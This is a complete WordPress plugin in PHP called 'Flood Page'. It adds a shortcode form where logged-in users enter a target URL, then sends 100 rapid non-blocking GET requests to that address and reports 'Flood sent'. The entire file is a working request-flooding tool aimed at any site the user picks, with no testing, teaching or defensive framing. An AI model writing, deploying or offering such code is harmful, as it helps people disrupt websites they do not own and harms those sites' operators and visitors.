<?php
/**
 * Plugin Name: Flood Page
 */

// Register the shortcode
add_shortcode( 'flood-page', 'flood_page_shortcode' );

function flood_page_shortcode() {
  if ( is_user_logged_in() ) {
    ob_start();
    ?>
    <form method="post">
      <label for="target_url">Target URL:</label>
      <input type="text" name="target_url" id="target_url" value="" size="50">
      <input type="submit" value="Flood">
    </form>
    <?php

    if ( isset( $_POST['target_url'] ) ) {
      $target_url = esc_url_raw( $_POST['target_url'] );

      // Perform the flood asynchronously
      for ( $i = 0; $i < 100; $i++ ) {
        wp_remote_get( $target_url, array(
          'cache' => false,
          'timeout' => 1,  // Set a short timeout (in seconds)
          'blocking' => false // Make the request non-blocking
        ) );
      }

      echo "<p>Flood sent to $target_url</p>";
    }

    return ob_get_clean();
  } else {
    return "<p>You must be logged in to access this page.</p>";
  }
}
?>